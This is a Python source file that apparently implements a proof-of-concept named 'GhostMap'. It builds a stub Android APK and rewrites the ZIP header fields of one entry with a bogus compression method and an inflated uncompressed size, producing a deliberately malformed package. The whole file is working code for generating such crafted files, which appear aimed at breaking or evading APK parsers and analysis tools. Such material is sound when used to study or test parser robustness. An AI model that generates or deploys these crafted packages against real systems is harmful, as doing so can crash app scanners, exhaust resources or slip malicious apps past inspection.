import os
import struct
import zipfile
import io

from .zip_utils import (
    LFH_STRUCT, CDH_STRUCT, EOCD_STRUCT,
    LOCAL_FILE_HEADER_SIG, CENTRAL_DIRECTORY_SIG, END_OF_CENTRAL_DIR_SIG,
)


class GhostMapGenerator:

    @staticmethod
    def build_base_apk():
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            manifest = b"\x03\x00\x08\x00" + b"\x00" * 64
            zf.writestr("AndroidManifest.xml", manifest)

            dex = b"dex\n035\x00" + b"\x00" * 112
            zf.writestr("classes.dex", dex)

            resource_data = b"GhostMap PoC resource placeholder\n" * 10
            zf.writestr("resources.arsc", resource_data)
        return buf.getvalue()

    @staticmethod
    def inject_ghostmap(zip_bytes, target_filename="resources.arsc",
                        fake_method=99, fake_uncompressed_size=0x01000000):
        data = bytearray(zip_bytes)

        eocd_idx = data.rfind(struct.pack("<I", END_OF_CENTRAL_DIR_SIG))
        if eocd_idx == -1:
            raise ValueError("Invalid ZIP")

        eocd = EOCD_STRUCT.unpack_from(data, eocd_idx)
        num_entries = eocd[4]
        cd_offset = eocd[6]

        pos = cd_offset
        for _ in range(num_entries):
            if pos + CDH_STRUCT.size > len(data):
                break
            cdh = CDH_STRUCT.unpack_from(data, pos)
            fn_len = cdh[10]
            extra_len = cdh[11]
            comment_len = cdh[12]
            local_offset = cdh[16]

            fn_start = pos + CDH_STRUCT.size
            fn = bytes(data[fn_start : fn_start + fn_len]).decode("utf-8", errors="ignore")

            if fn == target_filename:
                struct.pack_into("<H", data, pos + 10, fake_method)
                struct.pack_into("<I", data, pos + 24, fake_uncompressed_size)
                struct.pack_into("<H", data, local_offset + 8, fake_method)
                struct.pack_into("<I", data, local_offset + 22, fake_uncompressed_size)

            pos += CDH_STRUCT.size + fn_len + extra_len + comment_len

        return bytes(data)

    @classmethod
    def generate(cls, output_path, target_entry="resources.arsc",
                 method=99, phantom_size=16 * 1024 * 1024):
        raw = cls.build_base_apk()
        patched = cls.inject_ghostmap(raw, target_entry, method, phantom_size)
        os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
        with open(output_path, "wb") as f:
            f.write(patched)
        return output_path
